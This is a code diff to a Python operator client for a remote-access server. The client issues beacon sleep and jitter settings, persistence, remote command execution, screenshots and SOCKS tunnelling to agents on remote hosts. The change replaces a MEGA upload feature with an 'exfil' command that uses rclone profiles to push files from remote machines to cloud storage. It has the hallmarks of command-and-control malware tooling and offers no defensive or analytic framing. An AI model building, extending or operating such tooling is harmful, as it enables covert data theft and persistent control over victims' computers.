@@ -55,8 +55,8 @@ RMM_CLI_COMMANDS = [
     "set_jitter",
     "show_config",
     "download",
-    "mega",
-    "mega-config",
+    "exfil",
+    "rclone-config",
     "upload",
     "screenshot",
     "socks",
@@ -190,15 +190,26 @@ class RmmApiClient:
             {"remote_path": remote_path},
         )
 
-    def queue_mega(self, session_id: str, remote_path: str):
+    def queue_exfil(
+        self,
+        session_id: str,
+        remote_path: str,
+        profile: str | None = None,
+        dest: str | None = None,
+    ):
+        body: dict = {"remote_path": remote_path}
+        if profile:
+            body["profile"] = profile
+        if dest:
+            body["dest"] = dest
         return self.request(
             "POST",
-            f"/api/v1/sessions/{session_id}/mega",
-            {"remote_path": remote_path},
+            f"/api/v1/sessions/{session_id}/exfil",
+            body,
         )
 
-    def get_mega_config(self):
-        return self.request("GET", "/api/v1/mega/config")
+    def get_rclone_config(self):
+        return self.request("GET", "/api/v1/rclone/config")
 
     def queue_screenshot(self, session_id: str):
         return self.request(
@@ -567,31 +578,46 @@ def cmd_download(client: RmmApiClient, state: dict, args):
     print("Download queued — check server RMM_logs/downloads/ or poll events")
 
 
-def cmd_mega(client: RmmApiClient, state: dict, args):
+def cmd_exfil(client: RmmApiClient, state: dict, args):
     sid = require_session(state, args.session)
-    code, data = client.queue_mega(sid, args.remote_path)
+    code, data = client.queue_exfil(
+        sid,
+        args.remote_path,
+        profile=getattr(args, "profile", None),
+        dest=getattr(args, "dest", None),
+    )
     if code != 200:
-        die(f"MEGA queue failed ({code}): {data}")
-    mega = data.get("mega") if isinstance(data, dict) else None
-    if mega and mega.get("email"):
-        print(f"MEGA account: {mega.get('email')}  folder: {mega.get('folder') or '/'}")
-    print("MEGA upload queued — poll events for https://mega.nz/… link")
+        die(f"exfil queue failed ({code}): {data}")
+    profile = data.get("profile") if isinstance(data, dict) else None
+    if profile:
+        print(f"Profile: {profile}")
+    print("Exfil queued — poll events for cloud link or destination path")
 
 
-def cmd_mega_config(client: RmmApiClient, state: dict, args):
-    code, data = client.get_mega_config()
+def _print_rclone_config(data: dict) -> None:
+    if data.get("load_error"):
+        print(f"Profile load error: {data['load_error']}")
+    bin_ok = "yes" if data.get("rclone_binary") else "no"
+    print(f"Upload from: agent  rclone on server: {bin_ok}  max_bytes: {data.get('max_bytes')}")
+    print(f"Default profile: {data.get('default_profile')}")
+    profiles = data.get("profiles") or []
+    if not profiles:
+        print("No rclone profiles configured (RMM_RCLONE_PROFILES or RMM_RCLONE_PROFILES_FILE)")
+    for p in profiles:
+        name = p.get("name") or "?"
+        ptype = p.get("type") or "?"
+        folder = p.get("folder") or "/"
+        print(f"  - {name} ({ptype}) folder={folder}")
+
+
+def cmd_rclone_config(client: RmmApiClient, state: dict, args):
+    code, data = client.get_rclone_config()
     if code != 200:
-        die(f"mega config failed ({code}): {data}")
+        die(f"rclone config failed ({code}): {data}")
     if getattr(args, "json", False):
         print(json.dumps(data, indent=2))
         return
-    if not data.get("configured"):
-        print("MEGA not configured — set RMM_MEGA_EMAIL and RMM_MEGA_PASSWORD on the server")
-    else:
-        print(f"MEGA configured: {data.get('email') or '(email set)'}")
-        print(f"  folder: {data.get('folder') or '/'}")
-        print(f"  max_bytes: {data.get('max_bytes')}")
-        print(f"  library: {'mega.py-v2 installed' if data.get('library_available') else 'mega.py-v2 missing'}")
+    _print_rclone_config(data)
 
 
 def cmd_upload(client: RmmApiClient, state: dict, args):
@@ -692,8 +718,8 @@ def _show_help():
 Session:  list | use <id> | info | background | kill [id]
 Beacon:   set_sleep <seconds> | set_jitter <percent> | show_config
 Remote:   <command>  (queue) | exec <command>  (wait) | persist <cmd> | stop
-Files:    download <remote> | mega <remote> | upload <local> <remote> | screenshot
-Config:   mega-config   (MEGA account status on server)
+Files:    download <remote> | exfil <remote> [profile] | upload <local> <remote> | screenshot
+Config:   rclone-config   (rclone profiles + binary status on server)
 Tunnel:   socks list | socks [port] | socks stop   (SOCKS5 on 127.0.0.1, default 1080)
 Other:    events [since] | health | help | quit
 
@@ -1074,35 +1100,35 @@ def run_interactive(
                 else:
                     warn(f"failed ({code})")
                 continue
-            if cmd == "mega":
+            if cmd == "exfil":
                 if not rest:
-                    warn("Usage: mega <remote_path>")
+                    warn("Usage: exfil <remote_path> [profile]")
                     continue
                 sid = session_or_none(state)
                 if not sid:
                     warn("No session selected")
                     continue
-                remote = " ".join(rest)
-                code, data = client.queue_mega(sid, remote)
+                remote = rest[0]
+                profile = rest[1] if len(rest) > 1 else None
+                code, data = client.queue_exfil(sid, remote, profile=profile)
                 if code == 200:
-                    say("MEGA upload queued")
+                    say("Exfil queued")
                 elif code == 503 and isinstance(data, dict) and data.get("error"):
                     warn(str(data["error"]))
                 else:
                     warn(f"failed ({code})")
                 continue
-            if cmd == "mega-config":
-                code, data = client.get_mega_config()
+            if cmd == "rclone-config":
+                code, data = client.get_rclone_config()
                 if code != 200:
                     warn(f"failed ({code})")
                 elif isinstance(data, dict):
-                    if data.get("configured"):
-                        say(
-                            f"MEGA {data.get('email')}  folder={data.get('folder') or '/'}  "
-                            f"max={data.get('max_bytes')}  lib={'ok' if data.get('library_available') else 'missing'}"
-                        )
+                    if data.get("rclone_binary"):
+                        say(f"rclone binary ready; default profile={data.get('default_profile')}")
                     else:
-                        warn("MEGA not configured on server (RMM_MEGA_EMAIL / RMM_MEGA_PASSWORD)")
+                        warn("rclone.exe not on server — see tools/rclone/README.md")
+                    for p in data.get("profiles") or []:
+                        say(f"  {p.get('name')} ({p.get('type')}) folder={p.get('folder') or '/'}")
                 continue
             if cmd == "upload":
                 if len(rest) < 2:
@@ -1371,14 +1397,16 @@ def build_parser() -> argparse.ArgumentParser:
     sp_dl.add_argument("--session", "-s", default=None)
     sp_dl.set_defaults(func=cmd_download)
 
-    sp_mega = sub.add_parser("mega", help="Queue remote file upload to MEGA (server account)")
-    sp_mega.add_argument("remote_path")
-    sp_mega.add_argument("--session", "-s", default=None)
-    sp_mega.set_defaults(func=cmd_mega)
+    sp_exfil = sub.add_parser("exfil", help="Queue remote file exfil via rclone (agent-side upload)")
+    sp_exfil.add_argument("remote_path")
+    sp_exfil.add_argument("--profile", "-p", default=None, help="Named rclone profile on server")
+    sp_exfil.add_argument("--dest", default=None, help="Cloud destination path override")
+    sp_exfil.add_argument("--session", "-s", default=None)
+    sp_exfil.set_defaults(func=cmd_exfil)
 
-    sp_mcfg = sub.add_parser("mega-config", help="Show MEGA account configuration on server")
-    sp_mcfg.add_argument("--json", action="store_true", help="JSON output")
-    sp_mcfg.set_defaults(func=cmd_mega_config)
+    sp_rcfg = sub.add_parser("rclone-config", help="Show rclone profiles and binary status on server")
+    sp_rcfg.add_argument("--json", action="store_true", help="JSON output")
+    sp_rcfg.set_defaults(func=cmd_rclone_config)
 
     sp_ul = sub.add_parser("upload", help="Upload local file to remote path")
     sp_ul.add_argument("local")
